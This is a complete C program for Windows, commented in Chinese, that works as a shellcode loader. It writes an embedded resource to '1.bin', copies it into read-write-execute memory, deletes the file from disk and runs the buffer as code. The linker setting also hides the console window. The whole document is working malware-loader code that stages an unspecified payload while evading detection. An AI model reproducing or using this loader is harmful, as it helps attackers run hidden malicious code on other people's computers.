#include <stdio.h>
#include <windows.h>
#include "resource.h"
#pragma comment(linker, "/subsystem:windows /ENTRY:mainCRTStartup")

typedef void(__stdcall* CODE) ();


BOOL WriteResourceToDisk(LPWSTR path) {
	HGLOBAL     hgResHandle = NULL;
	HRSRC       hrRes = NULL;
	LPVOID		lpLock = NULL;
	DWORD       dwResourceSize = 0, dwBytesWritten = 0;
	HANDLE		hFile = NULL;
	BOOL		bRet;

	hrRes = FindResource(NULL, MAKEINTRESOURCE(IDR_SYS), RT_RCDATA);	// 定位资源
	if (!hrRes)
	{
		DWORD error = GetLastError();
		printf("[!] Failed to find resource: %d", error);
		return FALSE;
	}

	hgResHandle = LoadResource(NULL, hrRes);
	if (!hgResHandle)
	{
		printf("[!] Failed to load resource\n");
		return FALSE;
	}

	lpLock = (LPVOID)LockResource(hgResHandle);
	if (!lpLock)
	{
		printf("[!] Failed to lock resource\n");
		return FALSE;
	}

	dwResourceSize = SizeofResource(NULL, hrRes);
	if (dwResourceSize == 0)
	{
		printf("[!] Failed to get resource's size\n");
		return FALSE;
	}

	hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);	//在当前目录下创建文件
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[!] Failed to create bin\n");
		return FALSE;
	}

	bRet = WriteFile(hFile, lpLock, dwResourceSize, &dwBytesWritten, NULL);	//将资源文件写入到创建的文件中
	if (!bRet)
	{
		printf("[!] Failed to write driver\n");
		return FALSE;
	}

	CloseHandle(hFile);
	FreeResource(hgResHandle);

	return TRUE;
}


BOOL DeleteResourceFromDisk(LPWSTR Path) {
	BOOL		bRet;
	bRet = DeleteFileW(Path);
	if (!bRet)
	{
		printf("%d\n", GetLastError());
		return FALSE;
	}
	return TRUE;

}

int main(int argc, char* argv[])
{
	WCHAR BinPath[MAX_PATH] = { 0 };
	WCHAR cwd[MAX_PATH + 1];
	GetCurrentDirectoryW(MAX_PATH + 1, cwd);
	_snwprintf_s(BinPath, MAX_PATH, _TRUNCATE, L"%ws\\%ws", cwd, L"1.bin");

	DWORD dwSize = 0;
	DWORD dwRead = 0;
	
	if (WriteResourceToDisk(BinPath))
	{
		//打开要执行的ShellCode文件
		HANDLE hFile = CreateFileA("1.bin", GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			printf("[!] CreateFile Error\n");
			return -1;
		}

		//获取ShellCode的总大小
		dwSize = GetFileSize(hFile, NULL);

		//申请一块可读可写可执行的内存
		LPVOID lpAddress = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (lpAddress == NULL)
		{
			printf("[!] VirtualAlloc Error\n");
			CloseHandle(hFile);
			return -1;
		}

		//将文件读取到申请的内存中
		ReadFile(hFile, lpAddress, dwSize, &dwRead, 0);
		if (dwRead == dwSize)
		{
			CloseHandle(hFile);
			DeleteResourceFromDisk(BinPath);
		}

		//执行ShellCode
		CODE code = (CODE)lpAddress;

		code();
		return 0;
	}

}
